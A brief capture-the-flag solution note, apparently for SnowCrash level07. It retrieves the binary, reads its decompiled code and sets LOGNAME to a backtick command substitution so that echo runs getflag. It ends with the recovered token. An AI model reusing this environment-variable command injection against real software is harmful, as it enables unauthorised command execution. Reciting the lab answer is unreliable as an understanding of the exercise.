# download level07 from the vm
scp -P4242 level07@{VM_IP}:/home/user/level07/level07 ~/42/snowcrash
# decompile using this wonderful website
# http://retdec.hostbin.org/
# realize the code is reading the env variable LOGNAME to send to echo
# make echo display the result of getflag
export LOGNAME="\`getflag\`"
# run the program
./level07 # > fiumuikeil55xe9cu4dood66h